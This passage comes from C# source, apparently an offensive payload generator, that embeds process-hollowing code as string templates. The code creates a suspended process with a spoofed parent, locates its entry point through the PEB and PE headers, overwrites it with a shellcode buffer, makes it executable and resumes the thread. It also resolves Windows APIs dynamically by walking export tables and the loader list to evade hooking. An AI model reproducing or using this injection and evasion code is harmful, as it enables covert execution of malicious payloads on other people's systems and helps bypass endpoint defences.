                CreateProcess(null, ""<PROCESS>"", ref lpa, ref lta, false, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED | STRUCTS.ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref si, out pi);
            }
            catch (Exception error)
            {
                Console.Error.WriteLine(""error"" + error.StackTrace);
            }
            finally
            {
                DeleteProcThreadAttributeList(si.lpAttributeList);
                Marshal.FreeHGlobal(si.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }
            STRUCTS.PROCESS_BASIC_INFORMATION pbi = new STRUCTS.PROCESS_BASIC_INFORMATION();
            uint temp = 0;
            UInt32 success = ZwQueryInformationProcess(pi.hProcess, 0x0, ref pbi, (uint)(IntPtr.Size * 6), ref temp);
            IntPtr ptrToImageBase;
            if (x64)
            {
                ptrToImageBase = (IntPtr)((Int64)pbi.PebBaseAddress + 0x10);
            }
            else
            {
                ptrToImageBase = (IntPtr)((Int32)pbi.PebBaseAddress + 0x8);
            }
            byte[] addrBuf = new byte[IntPtr.Size];
            UInt32 nread = 0;
            NtReadVirtualMemory(pi.hProcess, ptrToImageBase, addrBuf, (uint)addrBuf.Length, ref nread);
            IntPtr svchostBase;
            if (x64)
            {
                svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            }
            else
            {
                svchostBase = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            }
            byte[] data = new byte[0x200];
            NtReadVirtualMemory(pi.hProcess, svchostBase, data, (uint)data.Length, ref nread);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint;
            if (x64)
            {
                addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            }
            else
            {
                addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt32)svchostBase);
            }
            UInt32 nread2 = 0;
            IntPtr bufferlength = new IntPtr(e.Length);
            UInt32 oldprotect = 0;
            NtProtectVirtualMemory.DynamicInvoke(pi.hProcess, addressOfEntryPoint, bufferlength, 0x4, oldprotect);
            NtWriteVirtualMemory.DynamicInvoke(pi.hProcess, addressOfEntryPoint, e, (UInt32)e.Length, nread2);
NtProtectVirtualMemory.DynamicInvoke(pi.hProcess, addressOfEntryPoint, bufferlength, 0x20, oldprotect);
            ResumeThread(pi.hThread); ";

                Classes = @"
     public class DELEGATES
        {
            //hollowing delegates
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate Boolean CreateProcess(string lpApplicationName, string lpCommandLine, ref STRUCTS.SECURITY_ATTRIBUTES lpProcessAttributes, ref STRUCTS.SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, STRUCTS.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STRUCTS.STARTUPINFOEX lpStartupInfo, out STRUCTS.PROCESS_INFORMATION lpProcessInformation);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 ZwQueryInformationProcess(IntPtr hProcess, Int32 procInformationClass, ref STRUCTS.PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate STRUCTS.NTSTATUS InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate STRUCTS.NTSTATUS UpdateProcThreadAttribute(IntPtr lpAttributeList, STRUCTS.ProcessCreationFlags dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate STRUCTS.NTSTATUS DeleteProcThreadAttributeList(IntPtr lpAttributeList);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, Int32 NewProtect, ref UInt32 OldProtect);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, Byte[] Buffer, UInt32 NumberOfBytesToRead, ref UInt32 NumberOfBytesRead);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint ResumeThread(IntPtr hThhread);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, Byte[] Buffer, UInt32 BufferLength, ref UInt32 BytesWritten);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtQueryInformationProcess(IntPtr processHandle, STRUCTS.PROCESSINFOCLASS processInformationClass, IntPtr processInformation, int processInformationLength, ref UInt32 returnLength);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void RtlZeroMemory(IntPtr Destination, int length);
        }

    public class STRUCTS
    {
        [Flags]
        public enum ProcessCreationFlags : uint
        {
            CREATE_SUSPENDED = 0x00000004,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        }
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
        public struct PROCESS_BASIC_INFORMATION
        {
            public STRUCTS.NTSTATUS ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }
        public enum ProcThreadAttribute : int
        {
            MITIGATION_POLICY = 0x20007,
            PARENT_PROCESS = 0x00020000
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }
        public enum NTSTATUS : uint
        {
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,
            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,
            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,
            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            ConflictingAddresses = 0xc0000018,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InsufficientResources = 0xc000009a,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            ProcessIsTerminating = 0xc000010a,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            InvalidAddress = 0xc0000141,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,
            MaximumNtStatus = 0xffffffff
        }
        public struct LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LDR_DATA_TABLE_ENTRY
        {
            public LIST_ENTRY InLoadOrderLinks;
            public LIST_ENTRY InMemoryOrderLinks;
            public LIST_ENTRY InInitializationOrderLinks;
            public IntPtr DllBase;
            public IntPtr EntryPoint;
            public UInt32 SizeOfImage;
            public UNICODE_STRING FullDllName;
            public UNICODE_STRING BaseDllName;
        }
        [StructLayout(LayoutKind.Explicit)]
        public struct ApiSetNamespace
        {
            [FieldOffset(0x0C)]
            public int Count;
            [FieldOffset(0x10)]
            public int EntryOffset;
        }
        [StructLayout(LayoutKind.Explicit, Size = 24)]
        public struct ApiSetNamespaceEntry
        {
            [FieldOffset(0x04)]
            public int NameOffset;
            [FieldOffset(0x08)]
            public int NameLength;
            [FieldOffset(0x10)]
            public int ValueOffset;
            [FieldOffset(0x14)]
            public int ValueLength;

        }

        [StructLayout(LayoutKind.Explicit)]
        public struct ApiSetValueEntry
        {
            [FieldOffset(0x00)]
            public int Flags;
            [FieldOffset(0x04)]
            public int NameOffset;
            [FieldOffset(0x08)]
            public int NameCount;
            [FieldOffset(0x0C)]
            public int ValueOffset;
            [FieldOffset(0x10)]
            public int ValueCount;
        }
        public enum PROCESSINFOCLASS : int
        {
            ProcessBasicInformation = 0, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
            ProcessWow64Information, // q: ULONG_PTR
        };
    }
    public class Invoke
    {
        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
        {
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }
        public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false, bool ResolveForwards = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + "", Dll was not found."");
            }
            return GetExportAddress(hModule, FunctionName, ResolveForwards);
        }
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, bool ResolveForwards = false)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Get the VAs of the name table's beginning and end.
                Int64 NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
                Int64 NamesFinal = NamesBegin + NumberOfNames * 4;

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);

                        if (ResolveForwards == true)
                            // If the export address points to a forward, get the address
                            FunctionPtr = GetForwardAddress(FunctionPtr);

                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException(""Failed to parse module exports."");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + "", export not found."");
            }
            return FunctionPtr;
        }
        public static IntPtr GetForwardAddress(IntPtr ExportAddress)
        {
            IntPtr FunctionPtr = ExportAddress;
            try
            {
                // Assume it is a forward. If it is not, we will get an error
                string ForwardNames = Marshal.PtrToStringAnsi(FunctionPtr);
                string[] values = ForwardNames.Split('.');

                string ForwardModuleName = values[0];
                string ForwardExportName = values[1];

                // Check if it is an API Set mapping
                Dictionary<string, string> ApiSet = GetApiSetMapping();
                string LookupKey = ForwardModuleName.Substring(0, ForwardModuleName.Length - 2) + "".dll"";
                if (ApiSet.ContainsKey(LookupKey))
                    ForwardModuleName = ApiSet[LookupKey];
                else
                    ForwardModuleName = ForwardModuleName + "".dll"";

                IntPtr hModule = GetPebLdrModuleEntry(ForwardModuleName);
                if (hModule != IntPtr.Zero)
                {
                    FunctionPtr = GetExportAddress(hModule, ForwardExportName);
                }
            }
            catch
            {
                // Do nothing, it was not a forward
            }
            return FunctionPtr;
        }
        public static STRUCTS.PROCESS_BASIC_INFORMATION NtQueryInformationProcessBasicInformation(IntPtr hProcess)
        {
            STRUCTS.NTSTATUS retValue = NtQueryInformationProcess(hProcess, STRUCTS.PROCESSINFOCLASS.ProcessBasicInformation, out IntPtr pProcInfo);
            if (retValue != STRUCTS.NTSTATUS.Success)
            {
                throw new UnauthorizedAccessException(""Access is denied."");
            }

            return (STRUCTS.PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pProcInfo, typeof(STRUCTS.PROCESS_BASIC_INFORMATION));
        }
        public static IntPtr GetPebLdrModuleEntry(string DLLName)
        {
            // Get _PEB pointer
            STRUCTS.PROCESS_BASIC_INFORMATION pbi = NtQueryInformationProcessBasicInformation((IntPtr)(-1));

            // Set function variables
            bool Is32Bit = false;
            UInt32 LdrDataOffset = 0;
            UInt32 InLoadOrderModuleListOffset = 0;
            if (IntPtr.Size == 4)
            {
                Is32Bit = true;
                LdrDataOffset = 0xc;
                InLoadOrderModuleListOffset = 0xC;
            }
            else
            {
                LdrDataOffset = 0x18;
                InLoadOrderModuleListOffset = 0x10;
            }

            // Get module InLoadOrderModuleList -> _LIST_ENTRY
            IntPtr PEB_LDR_DATA = Marshal.ReadIntPtr((IntPtr)((UInt64)pbi.PebBaseAddress + LdrDataOffset));
            IntPtr pInLoadOrderModuleList = (IntPtr)((UInt64)PEB_LDR_DATA + InLoadOrderModuleListOffset);
            STRUCTS.LIST_ENTRY le = (STRUCTS.LIST_ENTRY)Marshal.PtrToStructure(pInLoadOrderModuleList, typeof(STRUCTS.LIST_ENTRY));

            // Loop entries
            IntPtr flink = le.Flink;
            IntPtr hModule = IntPtr.Zero;
            STRUCTS.LDR_DATA_TABLE_ENTRY dte = (STRUCTS.LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(STRUCTS.LDR_DATA_TABLE_ENTRY));
            while (dte.InLoadOrderLinks.Flink != le.Blink)
            {
                // Match module name
                if (Marshal.PtrToStringUni(dte.FullDllName.Buffer).EndsWith(DLLName, StringComparison.OrdinalIgnoreCase))
                {
                    hModule = dte.DllBase;
                }

                // Move Ptr
                flink = dte.InLoadOrderLinks.Flink;
                dte = (STRUCTS.LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(STRUCTS.LDR_DATA_TABLE_ENTRY));
            }

            return hModule;
        }
        public static Dictionary<string, string> GetApiSetMapping()
        {
            STRUCTS.PROCESS_BASIC_INFORMATION pbi = NtQueryInformationProcessBasicInformation((IntPtr)(-1));
            UInt32 ApiSetMapOffset = IntPtr.Size == 4 ? (UInt32)0x38 : 0x68;
            // Create mapping dictionary
            Dictionary<string, string> ApiSetDict = new Dictionary<string, string>();
            IntPtr pApiSetNamespace = Marshal.ReadIntPtr((IntPtr)((UInt64)pbi.PebBaseAddress + ApiSetMapOffset));
            STRUCTS.ApiSetNamespace Namespace = (STRUCTS.ApiSetNamespace)Marshal.PtrToStructure(pApiSetNamespace, typeof(STRUCTS.ApiSetNamespace));
            for (var i = 0; i < Namespace.Count; i++)
            {
                STRUCTS.ApiSetNamespaceEntry SetEntry = new STRUCTS.ApiSetNamespaceEntry();
                IntPtr pSetEntry = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)Namespace.EntryOffset + (UInt64)(i * Marshal.SizeOf(SetEntry)));
                SetEntry = (STRUCTS.ApiSetNamespaceEntry)Marshal.PtrToStructure(pSetEntry, typeof(STRUCTS.ApiSetNamespaceEntry));
